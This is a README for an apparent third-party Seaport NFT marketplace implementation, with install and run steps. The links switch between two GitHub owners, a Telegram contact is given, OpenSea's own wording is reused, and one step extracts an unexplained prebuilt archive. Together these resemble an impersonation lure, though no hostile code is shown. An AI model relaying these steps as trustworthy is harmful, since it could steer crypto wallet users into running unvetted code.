# OpenSea-Seaport
![openSea-seaport-image](https://github.com/cyberlawd/OpenSea-SeaPort/blob/main/Seaport.jpeg)

# OpenSea-Seaport implementation
## ClientSide Development
### If you have questions or need any help, Message me here: [@cybergeek](https://t.me/cybergeeky) 

[OpenSea-Seaport](https://github.com/cyberlawd/OpenSea-SeaPort) is a brand new, open-source, web 3.0 marketplace protocol that enables buying and selling of NFTs safely and efficiently . Launched first on Ethereum, Seaport has helped create a better, more feature-rich experience for our community, while lowering the cost to use web 3.0 marketplaces, like OpenSea. This framework is for educational purpose only and also includes a [ServerSide](https://github.com/cyberlawd/SeaPort-ServerSide).

This framework is written using [Next.js](https://github.com/vercel/next.js) and uses [Typescript](https://github.com/microsoft/TypeScript). The packages that are being used include [Hardhat](https://github.com/NomicFoundation/hardhat) (Ethereum dev environment), [Vanilla-extract](https://github.com/seek-oss/vanilla-extract) (styling), [Zustand](https://github.com/pmndrs/zustand) (global state management), [Wagmi](https://github.com/wagmi-dev/wagmi) (blockchain fetching) and [SWR](https://github.com/vercel/swr) (database fetching).

### Installation

1. Install the OpenSea-Seaport server Side (https://github.com/cybergeeky/SeaPort-ServerSide).

2. Install a web3-provider, Just like [MetaMask](https://github.com/MetaMask/metamask-extension).

3. Open a [(CLI) Command Line Interface](https://en.wikipedia.org/wiki/Command-line_interface) and clone this repository:

```bash
git clone https://github.com/cybergeeky/OpenSea-SeaPort.git
```

4. Extract components.tar.gz

5. Inside the repository, execute the following command to install the dependencies:

```bash
yarn install
```

### Getting Started

1. Execute ServerSide (https://github.com/cybergeeky/SeaPort-ServerSide).

2. Open a new CLI. Compile the Seaport marketplace contracts:

```bash
npx hardhat compile
```

3. Spin up an instance of Hardhat Network:

```bash
npx hardhat node
```

4. Open a new CLI. Deploy the contracts to the instance of Hardhat Network:

```bash
npx hardhat run scripts/deploy.js --network localhost
```

5. Run the development server:

```bash
yarn dev
```

6. Then open [http://localhost:3000](http://localhost:3000) on your browser to see the implementation of the Seaport marketplace protocol.

##### Please ⭐ the repo to support my project
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
